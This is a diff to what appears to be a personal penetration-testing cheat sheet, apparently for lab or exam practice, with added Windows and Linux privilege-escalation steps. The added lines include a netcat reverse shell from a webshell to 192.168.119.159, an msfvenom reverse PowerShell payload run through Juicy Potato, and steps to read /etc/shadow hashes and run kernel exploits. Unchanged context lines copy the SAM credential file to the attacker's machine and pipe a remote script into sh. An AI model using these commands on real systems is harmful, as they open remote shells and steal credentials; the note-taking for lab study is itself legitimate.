@@ -25,6 +25,7 @@
 2. `net use \\myIP\smb` from window
 3. `copy \\myIP\smb\winpeas.exe   \windows\temp\winpeas.exe` 
 4. `copy c:\Windows\Repair\SAM \\MYIP\tools\` copy content to my kali
+5. in a webshell windows, `\\192.168.119.159\share\nc.exe -e cmd.exe 192.168.119.159 123`
 
  ## Privilege Escalation for Window
  0. Use PowerUp
@@ -183,6 +184,12 @@ oLink.Save
 5.  Go to Exploit DB https://www.exploit-db.com/?type=local&platform=windows  and see if there are any.
 
 ### Token Impersonation 
+1. Windows 7
+2. `whoami /priv` to see `SeImpersonatePrivilege` is allowed
+3. Transfer Juicy Potato.exe 
+4. `msfvenom -p cmd/windows/reverse_powershell lhost=192.168.119.159 lport=9999 > myshell.bat ` create a revershell bat 
+5. Transfer the bat
+6. `JuciyPotato.exe -t * -p myshell.bat -l 9999` (port has to be same as reverseshell)
 
 ## File Transfer to Linux 
 0.`python3 -c 'import pty; pty.spawn("/bin/bash")'` `export TERM=xterm-256color` Stabalize shell \
@@ -191,8 +198,33 @@ oLink.Save
 4.`wget http://$myIP:8080/linEum.sh .` \
 7.Or manually download the latest linpeas https://github.com/carlospolop/PEASS-ng/releases/tag/20221225
 
+
+
 ## Privilege Escalation for Linux
 0. `curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh` which would execute script (run from cd /tmp)
 1. `chmod +x linpeas.sh` and `./linpeas.sh`
+2. `wget "https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh" -O lse.sh;chmod 700 lse.sh (use lin enum smart)`
+3. or `curl "https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh" -Lo lse.sh;chmod 700 lse.sh`
+4. For linSmart start with `./lse.sh -i` then `./lse.sh -i -l 1` and `./lse.sh -i -l 2` for more verbosity.  
+
+### Service Exploit
+1.  `ps aux | grep "^root"` show all processes running as root.
+2.   `./lse.sh -i -l 1`and see services running with root
+3.   `<program> --version` or  `dpkg -l | grep <program>` for debian or  `rpm –qa | grep <program>` for rpm. Enumerate version to exploit.
+
+
+### Weak File Permission
+1.  `ls -l /etc/shadow` manually check if it is readable or writable
+2.  Extract the root user hash. Hash is from start of first : and before :
+3.  echo <HASH> > hash.txt
+### Kernal exploit (last resort)
+1.  https://www.exploit-db.com/exploits/44298 (check this one out :) )
+2.`uname -a` Enumerate kernel version
+3. Find matching exploits (Google, ExploitDB, GitHub) ` searchsploit <KERNAL VERSION> priv esc` on kali
+4. https://github.com/jondonas/linux-exploit-suggester-2 . Transfer file and run
+5. `./linux-exploit-suggester-2.pl –k <KERNAL VERSION> ` (dirty cow is a popular exploit)
+6. Enter `/usr/bin/passwd ` to get  a root shell
+7. Kernal exploit may be a one shot ...and may crash the system. /usr/bin/passwd 
+
 
 
